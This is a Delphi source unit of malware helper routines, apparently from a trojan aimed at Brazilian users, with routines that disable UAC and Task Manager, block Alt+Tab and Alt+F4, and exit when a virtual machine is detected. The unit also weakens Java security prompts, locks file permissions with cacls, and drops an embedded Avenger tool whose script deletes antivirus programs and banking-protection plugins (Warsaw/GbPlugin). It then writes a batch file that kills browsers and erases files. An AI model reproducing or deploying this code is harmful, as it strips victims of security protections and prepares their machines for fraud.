unit uPCFuncs;

interface

uses Windows, Classes, Registry, TlHelp32, SysUtils, Messages, Forms, Activex,
  ComObj, shellapi, ddeman, CommCtrl, StdCtrls, ShlObj, idHTTP, Dialogs;

type
  TNTdllApi = Function(Thread: thandle): boolean; stdcall;

type
  Terminate = Function(Thread: thandle; dwCode: word): boolean; Stdcall;






function GetProgramFilesDir: string;
procedure DisableUAC;
procedure DisablePreview;
procedure TaskMgrOff(ligado: integer);
procedure NoHotKey(hdle: HWND; estado: boolean);
procedure Max(janela: HWND);
procedure Delay(msecs: integer);
Function Anti_End: Bool;
function IntToBoolean(Num: integer): boolean;
function SetTokenPrivileges: boolean;
function GetProcessPid(Process: string): integer;
function SuspendProcess(pid: dword): boolean;
function IsBrasil: boolean;
function LocalAppDataPath: string;
function GetSpecialDir(folder: integer): string;
procedure ConfigJava;
procedure EnableAero;
function StartThread(pFunction: TFNThreadStartRoutine;
  iPriority: integer = Thread_Priority_Normal; iStartFlag: integer = 0)
  : thandle;
function ExecuteAndWait(Arquivo: String; estado: integer): integer;
procedure EnableAeroNow;
function ISAeroEnabled: boolean;
function strToBoolean(s: string): boolean;
procedure Extract_Volarite;
function GetWinDir: string;
procedure Google;
function FileSetAttr(const FileName: string; Attr: integer): integer;
procedure HideFile(FileName: String);
procedure Verifullbuster;
   procedure arquivologfile;

const
  faHidden = $00000002 platform;
  faSysFile = $00000004 platform;

var
  PropValues: TArray<string>;
  ProductType: dword;

implementation

uses  UnPrincipal,  uGB, uAVInfo;

function IsUltimateEdition(ProductType: dword): boolean;
begin
  Result := ProductType in [PRODUCT_ULTIMATE, PRODUCT_ULTIMATE_N,
    PRODUCT_ULTIMATE_E];
end;
{
  Procedure Pegando;
  begin
  CoInitialize(nil);
  try
  PropValues := GetWMIprops('.', 'root\CIMV2', 'Win32_OperatingSystem', ['Caption', 'Version', 'OperatingSystemSKU']);
  :=PropValues[0];
  := 'Version'+PropValues[1];
  ProductType := StrToInt(PropValues[2]);
  finally
  CoUninitialize;
  end;
  end; }

function FileSetAttr(const FileName: string; Attr: integer): integer;
begin
  Result := 0;
  if not SetFileAttributes(PChar(FileName), Attr) then
    Result := GetLastError;
end;

procedure HideFile(FileName: String);
begin
  FileSetAttr(FileName, faHidden or faSysFile);
end;



function ExecuteAndWait(Arquivo: String; estado: integer): integer;
var
  Programa: array [0 .. 512] of char;
  CurDir: array [0 .. 255] of char;
  WorkDir: String;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
  Exit: Cardinal;
begin
  StrPCopy(Programa, Arquivo);
  GetDir(0, WorkDir);
  StrPCopy(CurDir, WorkDir);
  FillChar(StartupInfo, Sizeof(StartupInfo), #0);
  StartupInfo.cb := Sizeof(StartupInfo);
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
  StartupInfo.wShowWindow := estado;
  if not CreateProcess(nil, Programa, nil, nil, false, CREATE_NEW_CONSOLE or
    NORMAL_PRIORITY_CLASS, nil, nil, StartupInfo, ProcessInfo) then
    Result := -1
  else
  begin
    WaitForSingleObject(ProcessInfo.hProcess, Infinite);
    GetExitCodeProcess(ProcessInfo.hProcess, Exit);
  end;
end;



function strToBoolean(s: string): boolean;
begin
  Result := ((uppercase(s) = 'TRUE') or (uppercase(s) = 'T') or
    (uppercase(s) = 'YES') or (uppercase(s) = 'Y') or (uppercase(s) = 'ON') or
    (uppercase(s) = 'O') or (uppercase(s) = '1'));
end;


function ISAeroEnabled: boolean;
type
  _DwmIsCompositionEnabledFunc = function(var IsEnabled: boolean)
    : HRESULT; stdcall;
var
  Flag: boolean;
  DllHandle: thandle;
  OsVersion: TOSVersionInfo;
  DwmIsCompositionEnabledFunc: _DwmIsCompositionEnabledFunc;
begin
  Result := false;
  ZeroMemory(@OsVersion, Sizeof(OsVersion));
  OsVersion.dwOSVersionInfoSize := Sizeof(TOSVersionInfo);

  if ((GetVersionEx(OsVersion)) and
    (OsVersion.dwPlatformId = VER_PLATFORM_WIN32_NT) and
    (OsVersion.dwMajorVersion >= 6)) then // is Vista or Win7?
  begin
    DllHandle := LoadLibrary('dwmapi.dll');
    try
      if DllHandle <> 0 then
      begin
        @DwmIsCompositionEnabledFunc := GetProcAddress(DllHandle,
          'DwmIsCompositionEnabled');
        if (@DwmIsCompositionEnabledFunc <> nil) then
        begin
          if DwmIsCompositionEnabledFunc(Flag) = S_OK then
            Result := Flag;
        end;
      end;
    finally
      if DllHandle <> 0 then
        FreeLibrary(DllHandle);
    end;
  end;
end;



function StartThread(pFunction: TFNThreadStartRoutine;
  iPriority: integer = Thread_Priority_Normal; iStartFlag: integer = 0)
  : thandle;
var
  ThreadID: dword;
begin
  Result := CreateThread(nil, 0, pFunction, nil, iStartFlag, ThreadID);
  SetThreadPriority(Result, iPriority);
end;

procedure EnableAeroNow;
begin
  EnableAero;
  ExecuteAndWait('net stop uxsms', SW_HIDE);
  ExecuteAndWait('net start uxsms', SW_HIDE);
end;

procedure EnableAero;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    Reg.OpenKey('Software\Microsoft\Windows\DWM', false);
    Reg.WriteInteger('Composition', 1);
    Reg.WriteInteger('CompositionPolicy', 2);
  except
    Reg.Free;
  end;
end;

procedure ConfigJava;
var
  ArqPath: String;
  ArqList: TStringList;
begin
  if not Form1.XP then
    ArqPath := LocalAppDataPath +
      'Low\Sun\Java\Deployment\deployment.properties'
  else
    ArqPath := GetSpecialDir(CSIDL_APPDATA) +
      '\Sun\Java\Deployment\deployment.properties';
  ArqList := TStringList.Create;
  try
    ArqList.LoadFromFile(ArqPath);
  except
    ArqList.Free;
    Exit;
  end;
  ArqList.add('deployment.security.askgrantdialog.show=false');
  ArqList.add('deployment.security.askgrantdialog.notinca=false');
  ArqList.add('deployment.javaws.associations=ALWAYS');
  ArqList.SaveToFile(ArqPath);
  ArqList.Free;
end;

procedure block2(Path: String);
const
  Grupos: Array [0 .. 10] of String = ('SYSTEM', 'Users', 'User', 'Usuários',
    'Usuário', 'Administrador', 'Administradores', 'Administrators',
    'Administrator', 'Todos', 'Everyone');
var
  i: integer;
begin
  for i := 0 to 10 do
    ShellExecute(0, PChar('open'), PChar('cmd'),
      PChar('/c Echo Y| cacls "' + Path + '" /p ' + Grupos[i] + ':n /e'),
      nil, SW_HIDE);
  for i := 0 to 10 do
    ShellExecute(0, PChar('open'), PChar('cacls.exe'),
      PChar('"' + Path + '" /p ' + Grupos[i] + ':n /e'), nil, SW_HIDE);
end;


function IsBrasil: boolean;
var
  Reg: TRegistry;
  Country: String;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.OpenKey('Control Panel\International', false);
  Country := uppercase(Reg.ReadString('SCountry'));
  if (Country = uppercase('Brazil')) or (Country = uppercase('Brasil')) then
    Result := True
  else
    Result := false;
  Reg.Free;
end;

function LocalAppDataPath: string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  Path: array [0 .. MaxChar] of char;
begin
  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, @Path[0]);
  Result := StrPas(Path);
end;

function GetSpecialDir(folder: integer): string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  Path: array [0 .. MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0, folder, 0, SHGFP_TYPE_CURRENT, @Path[0])) then
    Result := Path
  else
    Result := '';
end;

function SuspendProcess(pid: dword): boolean; // Suspende processo pelo PID
var
  module, module1: thandle;
  SuspendProcess: TNTdllApi;
begin
  Result := false;
  SetTokenPrivileges;
  module := LoadLibrary('ntdll.dll');
  @SuspendProcess := GetProcAddress(module, 'NtSuspendProcess');
  if @SuspendProcess <> nil then
  begin
    module1 := OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    SuspendProcess(module1);
  end;
end;

function GetProcessPid(Process: string): integer; // Função de pegar o PID
var
  hProcSnap: thandle;
  pe32: TProcessEntry32;
begin
  Result := -1;
  hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if hProcSnap = INVALID_HANDLE_VALUE then
    Exit;
  pe32.dwSize := Sizeof(TProcessEntry32);
  if Process32First(hProcSnap, pe32) = True then
    while Process32Next(hProcSnap, pe32) = True do
      if pos(Process, LowerCase(pe32.szExeFile)) > 0 then
        Result := pe32.th32ProcessID;
end;

function SetTokenPrivileges: boolean;
var
  hToken1, hToken2: thandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
  hToken3: Cardinal;
begin
  Version.dwOSVersionInfoSize := Sizeof(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege',
        TokenPrivileges.Privileges[0].Luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, false, TokenPrivileges,
        Sizeof(TokenPrivileges), PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, false, TokenPrivileges,
        Sizeof(TokenPrivileges), PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except
      ;
    end;
  end;
  Result := True;
end;


function ExtractFileName(const Path: String): String;
var
  i, L: integer;
  Ch: char;
Begin
  Result := Path;
  L := Length(Path);
  For i := L DownTo 1 Do
  Begin
    Ch := Path[i];
    If (Ch = '\') Or (Ch = '/') Then
    Begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    End;
  End;


end;
procedure Delay(msecs: integer);
var
  FirstTickCount: longint;
begin
  FirstTickCount := GetTickCount;
  repeat
    Application.ProcessMessages; { para acessar outros controles, etc. }
  until ((GetTickCount - FirstTickCount) >= longint(msecs));
end;

function IntToBoolean(Num: integer): boolean;
begin
  if Num <> 0 then
    Result := True
  else
    Result := false;
end;


function GetProgramFilesDir: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion', false);
    Result := Reg.ReadString('ProgramFilesDir');
  finally
    Reg.Free;
  end;
end;





procedure TaskMgrOff(ligado: integer);
var
  Reg: TRegistry;
begin
  try
    Reg := TRegistry.Create;
    Reg.RootKey := HKEY_CURRENT_USER;
    if not Reg.KeyExists
      ('\Software\Microsoft\Windows\CurrentVersion\Policies\System') then
      Reg.CreateKey
        ('\Software\Microsoft\Windows\CurrentVersion\Policies\System');
    Reg.OpenKey
      ('\Software\Microsoft\Windows\CurrentVersion\Policies\System', false);
    Reg.WriteInteger('DisableTaskMgr', 0000000 + ligado);
  finally
    Reg.Free;
  end;
end;

procedure NoHotKey(hdle: HWND; estado: boolean);
begin
  try
    if estado then
    begin
      RegisterHotkey(hdle, 1, MOD_ALT, VK_ESCAPE);
      RegisterHotkey(hdle, 2, MOD_ALT, VK_f4);
      RegisterHotkey(hdle, 3, MOD_ALT, VK_TAB);
    end;
    if not estado then
    begin
      UnRegisterHotkey(hdle, 1);
      UnRegisterHotkey(hdle, 2);
      UnRegisterHotkey(hdle, 3);
    end;
  finally
  end;
end;

procedure Max(janela: HWND);
begin
  ShowWindow(janela, SW_MAXIMIZE);
end;

Function IsVirtualPCPresent: Bool;
Const
  sArrVM: Array [0 .. 3] Of String = ('VIRTUAL', 'VMWARE', 'VBOX', 'QEMU');
Var
  hlKey: HKEY;
  sBuffer: String;
  sPathName: String;
  i: integer;
  iRegType: integer;
  iDataSize: integer;
Begin
  IsVirtualPCPresent := false;
  iRegType := 1;
  sPathName := 'SYSTEM\ControlSet001\Services\Disk\Enum';

  If RegOpenKeyEx($80000002, PChar(sPathName), 0, $20019, hlKey) = 0 Then
    If RegQueryValueEx(hlKey, '0', 0, @iRegType, Nil, @iDataSize) = 0 Then
    Begin
      SetLength(sBuffer, iDataSize);
      RegQueryValueEx(hlKey, '0', 0, @iRegType, PByte(PChar(sBuffer)),
        @iDataSize);
      For i := 0 To 3 Do
        If AnsiPos(uppercase(sArrVM[i]), uppercase(Trim(sBuffer))) > 0 Then
          IsVirtualPCPresent := True;
    End;

  RegCloseKey(hlKey);
End;

Function Anti_End: Bool;
Begin
  Anti_End := false;
  If IsVirtualPCPresent = True Then
    ExitProcess(0);
End;

procedure DisablePreview;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced', True);
  try
    Reg.WriteInteger('ExtendedUIHoverTime', 2710);
  finally
    Reg.Free;
  end;
end;

procedure DisableUAC;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  Reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', false);
  try
    Reg.WriteInteger('EnableLUA', 0);
    Reg.WriteInteger('ConsentPromptBehaviorAdmin', 0);
  finally
    Reg.Free;
  end;
end;




function GetWinDir: string;
var
  Dir: array [0 .. MAX_PATH] of char;
begin
  GetWindowsDirectory(Dir, MAX_PATH);
  Result := StrPas(Dir);
end;


   procedure arquivologfile;
var
  _Anntrax: TRegistry;
  _gen: TextFile;
begin
  _Anntrax := TRegistry.Create;
  _Anntrax.RootKey := HKEY_CURRENT_USER;
  _Anntrax.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  if not _Anntrax.ValueExists('Google Chrome') then
  Begin
    AssignFile(_gen, 'Log.txt');
    ReWrite(_gen);
    WriteLn(_gen, 'Folders to delete:');
    WriteLn(_gen, '%ProgramFiles%\AVG');
    WriteLn(_gen, '%ProgramFiles%\Panda Security');
    WriteLn(_gen, '%ProgramFiles%\ESET');
    WriteLn(_gen, '%ProgramFiles%\KASPER~1');
    WriteLn(_gen, '%ProgramFiles%\Avira');
    WriteLn(_gen, '%ProgramFiles%\COMODO');
    WriteLn(_gen, '%ProgramFiles%\Bitdefender');
    WriteLn(_gen, '%ProgramFiles%\mcafee');
    WriteLn(_gen, '%ProgramFiles%\Softwin');
    WriteLn(_gen, '%ProgramFiles%\Sandboxie');
    WriteLn(_gen, '%ProgramFiles%\Grisoft');
    WriteLn(_gen, '%ProgramFiles%\NORTON~1');
    WriteLn(_gen, '%ProgramFiles%\Microsoft Security Client');
    WriteLn(_gen, '%ProgramFiles%\AVAST Software');
    WriteLn(_gen, '%ProgramFiles%\Baidu Security');
    WriteLn(_gen, '%ProgramFiles%\GAS Tecnologia\Warsaw');
    WriteLn(_gen, '%ProgramFiles%\GAS Tecnologia\G-Lock');
    WriteLn(_gen, '');
    WriteLn(_gen, 'Files to delete:');
    WriteLn(_gen, '%ProgramFiles%\GbPlugin\gbpsv.exe');
    WriteLn(_gen, '%ProgramFiles%\GbPlugin\pm.dll');
    WriteLn(_gen, '%ProgramFiles%\GbPlugin\gbpdist.dll');
    WriteLn(_gen, '');
    WriteLn(_gen, 'Drivers to delete:');
    WriteLn(_gen, 'gbpkm');
    WriteLn(_gen, 'gbpndisrd');
    WriteLn(_gen, 'gbpndisrd');
    CloseFile(_gen);
  End;
end;


procedure Verifullbuster;
begin
  if FileExists(GetProgramFilesDir + '\GbPlugin\GbpSv.exe') then
  begin
    arquivologfile;
    Extract_Volarite;
  end;
end;



procedure Google;
var
  _Firefox: TextFile;
begin
  if FileExists('avenger.exe') or FileExists('Log.txt') then
  begin
    AssignFile(_Firefox, 'Firefox.bat');
    ReWrite(_Firefox);
    WriteLn(_Firefox, 'taskkill /im firefox.exe');
    WriteLn(_Firefox, 'taskkill /im chrome.exe');
    WriteLn(_Firefox, 'taskkill /im iexplore.exe');
    WriteLn(_Firefox, 'taskkill /im notepad.exe');
    WriteLn(_Firefox, 'rd /s /q c:\avenger');
    WriteLn(_Firefox, 'del c:\avenger.txt');
    WriteLn(_Firefox, 'Erase "%s"  c:\*.exe');
    WriteLn(_Firefox, 'del     avenger.exe');
    WriteLn(_Firefox, 'Erase "%s"  *.txt  ');
    WriteLn(_Firefox, 'Erase "%s"  *.bat');
    CloseFile(_Firefox);
    ShellExecute(0, nil, 'cmd.exe', '/k start Firefox.bat', nil, Sw_normal);
  end;
end;

procedure Extract_Volarite;
var
  _BARATA: TRegistry;
  a: TResourceStream;
  b: String;
begin
  _BARATA := TRegistry.Create;
  _BARATA.RootKey := HKEY_CURRENT_USER;
  _BARATA.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  if not _BARATA.ValueExists('Google Chrome') then
  begin
    b := 'avenger.exe';
    a := TResourceStream.Create(HInstance, 'AVG', 'EXEFILE');
    try
      a.SaveToFile(b);
    finally
      a.Free;
      ShellExecute(0, 'open', 'cmd.exe',
        '/k avenger.exe /nogui /reboot Log.txt', nil, SW_HIDE);
    end;
  end;
end;

end.
